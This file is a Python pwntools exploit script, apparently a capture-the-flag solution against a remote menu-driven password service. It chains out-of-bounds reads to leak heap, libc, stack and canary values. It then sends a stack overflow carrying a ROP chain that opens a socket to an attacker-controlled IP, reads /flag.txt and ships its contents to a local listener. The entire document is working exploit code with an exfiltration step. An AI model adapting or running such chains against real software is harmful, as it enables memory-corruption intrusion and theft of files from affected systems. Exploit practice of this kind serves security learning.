from pwn import *

###Util
def login(name):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': \n', name)

def register(name):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': \n', name)

def leave():
    r.sendlineafter(b'> ', b'3')

def report(title, data):
    r.sendlineafter(b'> ', b'4')
    r.sendafter(b': \n', data)
    r.sendafter(b': \n', title)

def create(passwd, idx):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': \n', passwd)
    r.sendlineafter(b': \n', str(idx).encode())

def show(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': \n', str(idx).encode())
    r.recvuntil(b'Password: ')
    return r.recvuntil(b'\nWhat would you', drop=True)

def delete(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': \n', str(idx).encode())

def logout():
    r.sendlineafter(b'> ', b'4')

###Addr
environ_offset = 0x221200

###ROPgdaget
L_pop_rdi = 0x2a3e5
L_pop_rsi = 0x2be51
L_pop_rdx_rbx = 0x90529
L_pop_rax = 0x45eb0
L_syscall = 0x42759

###Exploit
r = remote('flu.xxx', 10100)

register(b'M30W')
login(b'M30W')
for i in range(8):
    create(b'a'*0xf8, i)
for i in range(1, 8):
    delete(i)
delete(0)
heap = u64(show(39)+b'\x00\x00') - 0xce0
print(hex(heap))
logout()

report(b'a', b'\x00'*0x20 + p64(0x20) + p64(heap + 0x630))
login(b'M30W')
libc_base = u64(show(41)+b'\x00\x00') - 0x219ce0
print(hex(libc_base))
logout()

report(b'a', b'\x00'*0x20 + p64(0x20) + p64(libc_base + environ_offset))
login(b'M30W')
stack = u64(show(41)+b'\x00\x00')
print(hex(stack))
logout()

report(b'a', b'\x00'*0x20 + p64(0x20) + p64(stack - 0x160 + 1))
login(b'M30W')
canary = u64(b'\x00' + show(41)[:7])
print(hex(canary))
logout()

report(b'a', b'\x00'*0x10 + (p16(2) + p16(10101)[::-1] + p32(0xba1e708c) + b'\x00'*8) + b'/flag.txt\x00'.ljust(0x10, b'\x00'))

report(b'a'*0x20, b'\x00\x01\x01\x00\x01\xff\xff\xff\xff\xff')
ROPchain = p64(libc_base + L_pop_rdi) + p64(2) + \
           p64(libc_base + L_pop_rsi) + p64(1) + \
           p64(libc_base + L_pop_rdx_rbx) + p64(0) + p64(0) + \
           p64(libc_base + L_pop_rax) + p64(41) + \
           p64(libc_base + L_syscall) + \
           p64(libc_base + L_pop_rdi) + p64(0) + \
           p64(libc_base + L_pop_rsi) + p64(heap + 0x600) + \
           p64(libc_base + L_pop_rdx_rbx) + p64(0x10) + p64(0) + \
           p64(libc_base + L_pop_rax) + p64(42) + \
           p64(libc_base + L_syscall) + \
           p64(libc_base + L_pop_rdi) + p64(heap + 0x610) + \
           p64(libc_base + L_pop_rsi) + p64(0) + \
           p64(libc_base + L_pop_rdx_rbx) + p64(0) + p64(0) + \
           p64(libc_base + L_pop_rax) + p64(2) + \
           p64(libc_base + L_syscall) + \
           p64(libc_base + L_pop_rdi) + p64(1) + \
           p64(libc_base + L_pop_rsi) + p64(heap) + \
           p64(libc_base + L_pop_rdx_rbx) + p64(0x100) + p64(0) + \
           p64(libc_base + L_pop_rax) + p64(0) + \
           p64(libc_base + L_syscall) + \
           p64(libc_base + L_pop_rdi) + p64(0) + \
           p64(libc_base + L_pop_rsi) + p64(heap) + \
           p64(libc_base + L_pop_rdx_rbx) + p64(0x100) + p64(0) + \
           p64(libc_base + L_pop_rax) + p64(1) + \
           p64(libc_base + L_syscall)
report(b'a'*0x20, b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00\xff\xff\xff\xff'+b'\xff'*0x210 + p64(canary) + p64(heap + 0x20000) + ROPchain)

l = listen(10101)

leave()

l.wait_for_connection()
l.interactive()
